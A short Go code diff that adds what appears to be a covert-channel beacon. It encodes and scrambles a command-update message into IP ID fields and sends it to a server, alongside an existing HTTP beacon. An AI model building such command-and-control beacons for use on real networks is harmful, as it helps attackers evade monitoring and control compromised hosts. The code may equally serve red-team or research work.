@@ -37,6 +37,19 @@ func main() {
 		data: jsonData,
 	}
 
+	jsonData, err = json.Marshal(CommandUpdate{ip,id,"cooltest123 asd asd",nil})
+	debugFatal(err)
+
+	var ipidEncoder = IPIDEncoder {
+		data: jsonData,
+	}
+
+	var ipidUpdateRequest = BeaconIPID {
+		data: ipidEncoder.scramble(),
+	}
+
+	ipidUpdateRequest.queryServer()
+
 	var serverUpdateRequest = BeaconHttp {
 		method: "GET",
 		data: encoder.scramble(),
